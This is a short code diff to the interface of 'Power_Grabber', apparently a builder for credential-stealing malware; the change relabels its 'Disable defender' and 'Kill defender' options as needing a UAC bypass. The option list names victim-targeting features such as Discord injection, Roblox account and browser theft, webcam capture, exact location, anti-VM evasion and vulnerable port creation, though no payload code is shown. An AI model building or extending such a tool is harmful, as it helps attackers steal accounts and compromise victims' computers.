@@ -164,8 +164,8 @@ class Power_Grabber(ctk.CTk):
         hr.pack(pady=(0, 10))
         checkbox_options = [
             'Anti VM', 'Annoy Victim (Audio)', 'Browser Info', 'Clipboard contents',
-            'Disable defender', 'Discord Info', 'Discord Injection', 'Exact location',
-            'Games info', 'Kill defender', 'Obfuscate', 'Roblox account', 'Self destruction',
+            'Disable defender (Needs UAC Bypass)', 'Discord Info', 'Discord Injection', 'Exact location',
+            'Games info', 'Kill defender (Needs UAC Bypass)', 'Obfuscate', 'Roblox account', 'Self destruction',
             'Self exclusion', 'TCP-IP Connection', 'Screenshot', 'System info',
             'UAC Bypass', 'Vulnerable port creation', 'Webcam', 'Watch Dog'
         ]
@@ -190,12 +190,12 @@ class Power_Grabber(ctk.CTk):
         annoy_victim_checkbox = checkbox_dict['Annoy Victim (Audio)']
         browser_info_checkbox = checkbox_dict['Browser Info']
         clipboard_contents_checkbox = checkbox_dict['Clipboard contents']
-        disable_defender_checkbox = checkbox_dict['Disable defender']
+        disable_defender_checkbox = checkbox_dict['Disable defender (Needs UAC Bypass)']
         discord_info_checkbox = checkbox_dict['Discord Info']
         discord_injection_checkbox = checkbox_dict['Discord Injection']
         exact_location_checkbox = checkbox_dict['Exact location']
         games_info_checkbox = checkbox_dict['Games info']
-        kill_defender_checkbox = checkbox_dict['Kill defender']
+        kill_defender_checkbox = checkbox_dict['Kill defender (Needs UAC Bypass)']
         obfuscate_checkbox = checkbox_dict['Obfuscate']
         roblox_account_checkbox = checkbox_dict['Roblox account']
         screenshot_checkbox = checkbox_dict['Screenshot']
